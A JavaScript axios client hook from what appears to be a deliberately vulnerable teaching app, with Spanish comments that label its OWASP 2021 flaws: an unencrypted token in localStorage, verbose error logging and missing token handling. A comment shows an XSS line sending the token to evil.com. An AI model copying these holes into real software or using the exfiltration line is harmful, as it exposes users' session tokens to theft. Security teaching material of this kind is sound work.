// src/hooks/useApi.js
/*
  VULNERABILIDADES IMPLEMENTADAS:
  - A02:2021 Cryptographic Failures: Token en localStorage sin cifrar
  - A05:2021 Security Misconfiguration: Errores verbosos expuestos, withCredentials false
  - A07:2021 Identification and Authentication Failures: Token accesible por XSS
  - A09:2021 Security Logging and Monitoring Failures: console.error en producción
*/
import axios from "axios";
import { API } from "../constants/routes";

// VULNERABLE A05:2021 - Security Misconfiguration
// withCredentials: false significa que no envía cookies HttpOnly
// Depende 100% de localStorage para autenticación (inseguro)
const api = axios.create({
  baseURL: API.BASE,
  withCredentials: false, // VULNERABLE: Sin soporte para cookies HttpOnly seguras
});

// VULNERABLE A02:2021 - Cryptographic Failures (CRÍTICO)
// VULNERABLE A07:2021 - Identification and Authentication Failures (CRÍTICO)
// Request interceptor: inject token if present
api.interceptors.request.use((cfg) => {
  // VULNERABLE A02: Token almacenado en localStorage sin cifrar
  // VULNERABLE A07: localStorage es accesible por cualquier script (XSS)
  // Si hay XSS, el atacante puede robar el token:
  // fetch('https://evil.com?token=' + localStorage.getItem('token'))
  const token = localStorage.getItem("token");

  if (token) cfg.headers.Authorization = `Bearer ${token}`;
  return cfg;
});

// VULNERABLE A05:2021 - Security Misconfiguration
// VULNERABLE A09:2021 - Security Logging and Monitoring Failures
// Response interceptor: show verbose errors (VULNERABLE)
api.interceptors.response.use(
  (res) => res,
  (err) => {
    // VULNERABLE A09: console.error expuesto en producción
    // Expone detalles del error en la consola del navegador
    // Puede revelar: estructura de API, mensajes de error del backend, stack traces
    console.error("API ERROR", err.response?.data || err.message);

    // VULNERABLE A05: No maneja errores de forma segura
    // No diferencia entre errores 401, 403, 500
    // No redirige en caso de token expirado
    // No implementa refresh token automático

    // VULNERABLE A09: No registra errores en sistema de logging
    // Debería enviar a servicio como Sentry, DataDog, etc.

    return Promise.reject(err);
  }
);

// VULNERABLE A07:2021 - Identification and Authentication Failures
// Sin implementación de:
// - Refresh token automático
// - Logout en caso de 401
// - Detección de token expirado antes de hacer request
// - Renovación silenciosa de token

// VULNERABLE A05:2021 - Security Misconfiguration
// Sin headers de seguridad:
// - No configura timeout para requests
// - No limita tamaño de respuesta
// - No valida certificados SSL en desarrollo

export default api;
